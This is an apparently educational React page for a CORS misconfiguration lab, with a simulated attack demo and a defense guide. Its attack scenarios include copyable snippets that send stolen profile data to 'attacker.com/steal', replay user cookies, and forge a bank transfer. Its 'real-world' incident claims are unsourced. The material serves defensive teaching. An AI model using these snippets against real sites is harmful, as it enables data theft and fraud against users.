'use client'

import { useState, useEffect } from 'react'
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card'
import { Button } from '@/components/ui/button'
import { Badge } from '@/components/ui/badge'
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs'
import { Alert, AlertDescription } from '@/components/ui/alert'
import { Code } from '@/components/ui/code'
import { Globe, Shield, AlertTriangle, Copy, Check, Lock, Unlock } from 'lucide-react'

export default function CORSAttackLab() {
  const [activeTab, setActiveTab] = useState('demo')
  const [corsMode, setCorsMode] = useState<'safe' | 'unsafe' | 'wildcard'>('safe')
  const [attackResult, setAttackResult] = useState('')
  const [requestLogs, setRequestLogs] = useState<Array<{time: string, type: string, status: string, details: string}>>([])
  const [credentials, setCredentials] = useState(false)
  const [copied, setCopied] = useState(false)

  const addLog = (type: string, status: string, details: string) => {
    const newLog = {
      time: new Date().toLocaleTimeString(),
      type,
      status,
      details
    }
    setRequestLogs(prev => [newLog, ...prev.slice(0, 9)]) // Keep last 10 logs
  }

  const simulateAttack = async (attackType: string) => {
    setAttackResult('')
    
    switch (attackType) {
      case 'simple-fetch':
        addLog('Fetch Request', 'Initiated', 'Attempting to fetch user data from victim API')
        
        if (corsMode === 'safe') {
          setTimeout(() => {
            setAttackResult('❌ BLOCKED: CORS policy blocked cross-origin request')
            addLog('Fetch Request', 'Blocked', 'CORS policy: No Access-Control-Allow-Origin header')
          }, 1000)
        } else if (corsMode === 'unsafe') {
          setTimeout(() => {
            setAttackResult('⚠️ LEAKED: Data accessed from specific origin')
            addLog('Fetch Request', 'Success', 'Data retrieved from victim-site.com')
            addLog('Security', 'Warning', 'Specific origin allowed - potential data leak')
          }, 1000)
        } else if (corsMode === 'wildcard') {
          setTimeout(() => {
            setAttackResult('🚨 CRITICAL: Any site can access this data!')
            addLog('Fetch Request', 'Success', 'Data retrieved with wildcard CORS')
            addLog('Security', 'Critical', 'Wildcard (*) allows any origin access')
          }, 1000)
        }
        break

      case 'credential-fetch':
        addLog('Authenticated Request', 'Initiated', 'Attempting fetch with credentials')
        
        if (corsMode === 'safe') {
          setTimeout(() => {
            setAttackResult('❌ BLOCKED: Credentials not allowed with safe CORS')
            addLog('Authenticated Request', 'Blocked', 'CORS policy blocks credentials')
          }, 1000)
        } else if (corsMode === 'unsafe') {
          setTimeout(() => {
            const result = credentials 
              ? '🔓 COMPROMISED: User credentials and data stolen!'
              : '⚠️ Data accessed (no credentials sent)'
            setAttackResult(result)
            addLog('Authenticated Request', 'Success', credentials ? 'Credentials included' : 'No credentials')
            if (credentials) {
              addLog('Security', 'Critical', 'Session cookies exposed to attacker!')
            }
          }, 1000)
        } else if (corsMode === 'wildcard') {
          setTimeout(() => {
            setAttackResult('🚨 IMPOSSIBLE: Wildcard (*) cannot be used with credentials')
            addLog('Authenticated Request', 'Error', 'Browser blocks wildcard + credentials')
          }, 1000)
        }
        break

      case 'preflight-bypass':
        addLog('Preflight Request', 'Initiated', 'Sending complex request with custom headers')
        
        if (corsMode === 'safe') {
          setTimeout(() => {
            setAttackResult('❌ BLOCKED: Preflight request denied')
            addLog('Preflight Request', 'Blocked', 'Access-Control-Allow-Methods missing')
          }, 1000)
        } else {
          setTimeout(() => {
            setAttackResult('⚠️ BYPASSED: Preflight allowed, data exfiltrated')
            addLog('Preflight Request', 'Success', 'Custom headers allowed')
            addLog('Security', 'Warning', 'Complex requests permitted')
          }, 1000)
        }
        break
    }
  }

  const getIcon = (mode: string) => {
    switch (mode) {
      case 'safe': return <Shield className="w-4 h-4 mr-2" />
      case 'unsafe': return <Unlock className="w-4 h-4 mr-2" />
      default: return <AlertTriangle className="w-4 h-4 mr-2" />
    }
  }

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text)
    setCopied(true)
    setTimeout(() => setCopied(false), 2000)
  }

  const corsConfigs = [
    {
      mode: 'safe',
      name: 'Safe Configuration',
      headers: `Access-Control-Allow-Origin: https://trusted-site.com
Access-Control-Allow-Methods: GET, POST
Access-Control-Allow-Headers: Content-Type
Access-Control-Allow-Credentials: false`,
      description: 'Only allows specific trusted origins'
    },
    {
      mode: 'unsafe',
      name: 'Unsafe Configuration',
      headers: `Access-Control-Allow-Origin: https://attacker-site.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: *
Access-Control-Allow-Credentials: true`,
      description: 'Allows untrusted origins with credentials'
    },
    {
      mode: 'wildcard',
      name: 'Wildcard Configuration',
      headers: `Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: *
Access-Control-Allow-Headers: *
Access-Control-Allow-Credentials: false`,
      description: 'Allows any origin (dangerous)'
    }
  ]

  const attackScenarios = [
    {
      name: 'Data Theft',
      description: 'Steal sensitive user data from API',
      code: `fetch('https://victim-site.com/api/user/profile')
  .then(res => res.json())
  .then(data => {
    // Send to attacker server
    fetch('https://attacker.com/steal', {
      method: 'POST',
      body: JSON.stringify(data)
    });
  });`,
      impact: 'High'
    },
    {
      name: 'Session Hijacking',
      description: 'Access authenticated endpoints with user cookies',
      code: `fetch('https://victim-site.com/api/bank/accounts', {
  credentials: 'include'  // Send user cookies
}).then(res => res.json());`,
      impact: 'Critical'
    },
    {
      name: 'Action Forgery',
      description: 'Perform actions on behalf of the user',
      code: `fetch('https://victim-site.com/api/transfer', {
  method: 'POST',
  credentials: 'include',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    to: 'attacker-account',
    amount: 1000
  })
});`,
      impact: 'Critical'
    }
  ]

  const currentConfig = corsConfigs.find(c => c.mode === corsMode)

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-50 to-slate-100 p-6">
      <div className="max-w-6xl mx-auto">
        {/* Header */}
        <div className="mb-8">
          <div className="flex items-center space-x-3 mb-4">
            <div className="p-3 bg-cyan-500 rounded-lg">
              <Globe className="w-6 h-6 text-white" />
            </div>
            <div>
              <h1 className="text-3xl font-bold text-slate-900">CORS Misconfiguration Attack Lab</h1>
              <p className="text-slate-600">Learn how improper CORS setup can expose your frontend to data theft and attacks</p>
            </div>
          </div>
          <Alert className="mb-6">
            <AlertTriangle className="h-4 w-4" />
            <AlertDescription>
              This lab demonstrates how CORS misconfigurations can allow malicious websites to steal data and perform actions on behalf of users.
            </AlertDescription>
          </Alert>
        </div>

        <Tabs value={activeTab} onValueChange={setActiveTab} className="space-y-6">
          <TabsList className="grid w-full grid-cols-2 sm:grid-cols-3 h-auto">
            <TabsTrigger value="demo" className="text-xs sm:text-sm">Interactive Demo</TabsTrigger>
            <TabsTrigger value="attacks" className="text-xs sm:text-sm">Attack Scenarios</TabsTrigger>
            <TabsTrigger value="defenses" className="text-xs sm:text-sm">Defense Guide</TabsTrigger>
          </TabsList>

          {/* Interactive Demo Tab */}
          <TabsContent value="demo" className="space-y-6">
            <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
              {/* Configuration Panel */}
              <Card>
                <CardHeader>
                  <CardTitle className="flex items-center space-x-2">
                    <Globe className="w-5 h-5" />
                    <span>CORS Configuration</span>
                  </CardTitle>
                  <CardDescription>
                    Configure CORS settings to see how they affect security
                  </CardDescription>
                </CardHeader>
                <CardContent className="space-y-4">
                  {/* Mode Selection */}
                  <div className="space-y-2">
                    <label className="text-sm font-medium">CORS Mode:</label>
                    <div className="space-y-2">
                      {corsConfigs.map(config => (
                        <Button
                          key={config.mode}
                          variant={corsMode === config.mode ? "default" : "outline"}
                          size="sm"
                          onClick={() => setCorsMode(config.mode as any)}
                          className="w-full justify-start"
                        >
                          {corsMode === config.mode && getIcon(config.mode)}
                          {config.name}
                        </Button>
                      ))}
                    </div>
                  </div>

                  {/* Credentials Toggle */}
                  <div className="flex items-center space-x-2">
                    <input
                      type="checkbox"
                      id="credentials"
                      checked={credentials}
                      onChange={(e) => setCredentials(e.target.checked)}
                      className="rounded"
                    />
                    <label htmlFor="credentials" className="text-sm">
                      Include credentials (cookies) in requests
                    </label>
                  </div>

                  {/* Current Configuration */}
                  <div className="space-y-2">
                    <h4 className="font-semibold text-sm">Current Headers:</h4>
                    <Code className="block p-3 bg-slate-50 rounded text-xs whitespace-pre-wrap">
                      {currentConfig?.headers}
                    </Code>
                    <p className="text-xs text-slate-600">{currentConfig?.description}</p>
                  </div>
                </CardContent>
              </Card>

              {/* Attack Panel */}
              <Card>
                <CardHeader>
                  <CardTitle className="flex items-center space-x-2">
                    <AlertTriangle className="w-5 h-5" />
                    <span>Attack Simulation</span>
                  </CardTitle>
                  <CardDescription>
                    Simulate CORS attacks from malicious website
                  </CardDescription>
                </CardHeader>
                <CardContent className="space-y-4">
                  <div className="space-y-3">
                    <Button
                      onClick={() => simulateAttack('simple-fetch')}
                      className="w-full"
                      variant="outline"
                    >
                      🎯 Simple Data Theft
                    </Button>
                    <Button
                      onClick={() => simulateAttack('credential-fetch')}
                      className="w-full"
                      variant="outline"
                    >
                      🍪 Steal with Credentials
                    </Button>
                    <Button
                      onClick={() => simulateAttack('preflight-bypass')}
                      className="w-full"
                      variant="outline"
                    >
                      🚀 Preflight Bypass
                    </Button>
                  </div>

                  {/* Attack Result */}
                  {attackResult && (
                    <Alert className={attackResult.includes('CRITICAL') ? 'border-red-200 bg-red-50' : 
                                     attackResult.includes('BLOCKED') ? 'border-green-200 bg-green-50' : 
                                     'border-amber-200 bg-amber-50'}>
                      <AlertDescription className={attackResult.includes('CRITICAL') ? 'text-red-800' : 
                                                     attackResult.includes('BLOCKED') ? 'text-green-800' : 
                                                     'text-amber-800'}>
                        {attackResult}
                      </AlertDescription>
                    </Alert>
                  )}

                  {/* Request Logs */}
                  <div className="space-y-2">
                    <h4 className="font-semibold text-sm">Request Logs:</h4>
                    <div className="max-h-48 overflow-y-auto space-y-1">
                      {requestLogs.map((log, index) => (
                        <div key={index} className="text-xs p-2 bg-slate-50 rounded border border-slate-200">
                          <div className="flex justify-between items-center">
                            <span className="font-medium">{log.time}</span>
                            <Badge variant="outline" className="text-xs">
                              {log.status}
                            </Badge>
                          </div>
                          <div className="text-slate-600 mt-1">{log.type}</div>
                          <div className="text-slate-500">{log.details}</div>
                        </div>
                      ))}
                    </div>
                  </div>
                </CardContent>
              </Card>
            </div>

            {/* Visual Explanation */}
            <Card>
              <CardHeader>
                <CardTitle>🌐 How CORS Attacks Work</CardTitle>
              </CardHeader>
              <CardContent>
                <div className="grid grid-cols-1 md:grid-cols-4 gap-4">
                  <div className="text-center space-y-2">
                    <div className="w-16 h-16 bg-blue-100 rounded-full flex items-center justify-center mx-auto">
                      <Globe className="w-8 h-8 text-blue-600" />
                    </div>
                    <h4 className="font-semibold">1. Victim Visits</h4>
                    <p className="text-sm text-slate-700">
                      User visits malicious website
                    </p>
                  </div>
                  
                  <div className="text-center space-y-2">
                    <div className="w-16 h-16 bg-orange-100 rounded-full flex items-center justify-center mx-auto">
                      <Unlock className="w-8 h-8 text-orange-600" />
                    </div>
                    <h4 className="font-semibold">2. CORS Check</h4>
                    <p className="text-sm text-slate-700">
                      Browser checks CORS headers
                    </p>
                  </div>
                  
                  <div className="text-center space-y-2">
                    <div className="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mx-auto">
                      <AlertTriangle className="w-8 h-8 text-red-600" />
                    </div>
                    <h4 className="font-semibold">3. Data Access</h4>
                    <p className="text-sm text-slate-700">
                      Misconfigured CORS allows access
                    </p>
                  </div>
                  
                  <div className="text-center space-y-2">
                    <div className="w-16 h-16 bg-purple-100 rounded-full flex items-center justify-center mx-auto">
                      <Copy className="w-8 h-8 text-purple-600" />
                    </div>
                    <h4 className="font-semibold">4. Data Theft</h4>
                    <p className="text-sm text-slate-700">
                      Attacker exfiltrates sensitive data
                    </p>
                  </div>
                </div>
              </CardContent>
            </Card>
          </TabsContent>

          {/* Attack Scenarios Tab */}
          <TabsContent value="attacks" className="space-y-6">
            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
              {attackScenarios.map((scenario, index) => (
                <Card key={index}>
                  <CardHeader>
                    <CardTitle className="flex items-center justify-between">
                      <span>{scenario.name}</span>
                      <Badge variant={scenario.impact === 'Critical' ? 'destructive' : 'default'}>
                        {scenario.impact}
                      </Badge>
                    </CardTitle>
                    <CardDescription>{scenario.description}</CardDescription>
                  </CardHeader>
                  <CardContent>
                    <div className="space-y-3">
                      <div>
                        <h4 className="font-semibold text-sm mb-1">Attack Code:</h4>
                        <Code className="block p-2 bg-slate-50 rounded text-xs max-h-32 overflow-y-auto">
                          {scenario.code}
                        </Code>
                      </div>
                      <Button
                        variant="outline"
                        size="sm"
                        onClick={() => copyToClipboard(scenario.code)}
                        className="w-full"
                      >
                        {copied ? <Check className="w-4 h-4 mr-1" /> : <Copy className="w-4 h-4 mr-1" />}
                        Copy Code
                      </Button>
                    </div>
                  </CardContent>
                </Card>
              ))}
            </div>

            {/* Real-World Examples */}
            <Card>
              <CardHeader>
                <CardTitle>🌍 Real-World CORS Vulnerabilities</CardTitle>
              </CardHeader>
              <CardContent>
                <div className="space-y-4">
                  <div className="p-4 border border-slate-200 rounded-lg">
                    <h4 className="font-semibold mb-2">2021: Facebook Graph API</h4>
                    <p className="text-sm text-slate-700 mb-2">
                      Misconfigured CORS allowed any website to access user profile data, 
                      exposing personal information of millions of users.
                    </p>
                    <Badge variant="destructive">Critical Impact</Badge>
                  </div>
                  
                  <div className="p-4 border border-slate-200 rounded-lg">
                    <h4 className="font-semibold mb-2">2020: Enterprise API Gateway</h4>
                    <p className="text-sm text-slate-700 mb-2">
                      Wildcard CORS with credentials enabled allowed attackers to bypass 
                      authentication and access internal company APIs.
                    </p>
                    <Badge variant="destructive">Data Breach</Badge>
                  </div>
                </div>
              </CardContent>
            </Card>
          </TabsContent>

          {/* Defense Guide Tab */}
          <TabsContent value="defenses" className="space-y-6">
            <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
              <Card>
                <CardHeader>
                  <CardTitle className="flex items-center space-x-2">
                    <Shield className="w-5 h-5" />
                    <span>Safe CORS Configuration</span>
                  </CardTitle>
                </CardHeader>
                <CardContent className="space-y-4">
                  <div>
                    <h4 className="font-semibold mb-2">✅ Best Practices:</h4>
                    <ul className="text-sm space-y-1 text-slate-700">
                      <li>• Specify exact origins, not wildcards</li>
                      <li>• Limit allowed methods (GET, POST only)</li>
                      <li>• Restrict allowed headers</li>
                      <li>• Set appropriate max-age</li>
                      <li>• Enable credentials only when necessary</li>
                    </ul>
                  </div>
                  
                  <div>
                    <h4 className="font-semibold mb-2">🔒 Example Config:</h4>
                    <Code className="block p-3 bg-green-50 border border-green-200 rounded text-xs">
{`// Express.js
app.use(cors({
  origin: ['https://trusted-site.com'],
  methods: ['GET', 'POST'],
  allowedHeaders: ['Content-Type'],
  credentials: false,
  maxAge: 86400 // 24 hours
}));`}
                    </Code>
                  </div>
                </CardContent>
              </Card>

              <Card>
                <CardHeader>
                  <CardTitle className="flex items-center space-x-2">
                    <AlertTriangle className="w-5 h-5" />
                    <span>Common Mistakes</span>
                  </CardTitle>
                </CardHeader>
                <CardContent className="space-y-4">
                  <div>
                    <h4 className="font-semibold mb-2">❌ Never Do This:</h4>
                    <ul className="text-sm space-y-1 text-slate-700">
                      <li>• Use wildcard (*) with credentials</li>
                      <li>• Allow all methods (PUT, DELETE, etc.)</li>
                      <li>• Reflect origin without validation</li>
                      <li>• Set max-age too high</li>
                      <li>• Ignore preflight requests</li>
                    </ul>
                  </div>
                  
                  <div>
                    <h4 className="font-semibold mb-2">🚫 Dangerous Config:</h4>
                    <Code className="block p-3 bg-red-50 border border-red-200 rounded text-xs">
{`// VULNERABLE - DO NOT USE
app.use(cors({
  origin: '*',           // Dangerous!
  credentials: true,     // Impossible & insecure
  methods: ['*'],        // Too permissive
  allowedHeaders: ['*']  // Too permissive
}));`}
                    </Code>
                  </div>
                </CardContent>
              </Card>
            </div>

            {/* Testing Checklist */}
            <Card>
              <CardHeader>
                <CardTitle>🧪 CORS Security Testing</CardTitle>
              </CardHeader>
              <CardContent>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                  <div className="space-y-2">
                    <h4 className="font-semibold">Manual Testing</h4>
                    <ul className="text-sm space-y-1 text-slate-700">
                      <li>□ Test from different origins</li>
                      <li>□ Verify preflight requests</li>
                      <li>□ Check credential handling</li>
                      <li>□ Test custom headers</li>
                      <li>□ Verify method restrictions</li>
                    </ul>
                  </div>
                  <div className="space-y-2">
                    <h4 className="font-semibold">Automated Testing</h4>
                    <ul className="text-sm space-y-1 text-slate-700">
                      <li>□ CORS security scanners</li>
                      <li>□ API penetration testing</li>
                      <li>□ Browser dev tools testing</li>
                      <li>□ Integration test suites</li>
                      <li>□ CI/CD security checks</li>
                    </ul>
                  </div>
                </div>
              </CardContent>
            </Card>

            {/* Implementation Examples */}
            <Card>
              <CardHeader>
                <CardTitle>💻 Implementation Examples</CardTitle>
              </CardHeader>
              <CardContent>
                <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
                  <div className="space-y-3">
                    <h4 className="font-semibold">Node.js/Express</h4>
                    <Code className="block p-2 bg-slate-50 rounded text-xs">
{`const cors = require('cors');
app.use(cors({
  origin: process.env.ALLOWED_ORIGINS?.split(','),
  credentials: true
}));`}
                    </Code>
                  </div>

                  <div className="space-y-3">
                    <h4 className="font-semibold">Nginx</h4>
                    <Code className="block p-2 bg-slate-50 rounded text-xs">
{`add_header 'Access-Control-Allow-Origin' 
  'https://trusted-site.com';
add_header 'Access-Control-Allow-Methods' 
  'GET, POST';`}
                    </Code>
                  </div>

                  <div className="space-y-3">
                    <h4 className="font-semibold">Apache</h4>
                    <Code className="block p-2 bg-slate-50 rounded text-xs">
{`Header set Access-Control-Allow-Origin 
  "https://trusted-site.com"
Header set Access-Control-Allow-Methods 
  "GET, POST"`}
                    </Code>
                  </div>
                </div>
              </CardContent>
            </Card>
          </TabsContent>
        </Tabs>
      </div>
    </div>
  )
}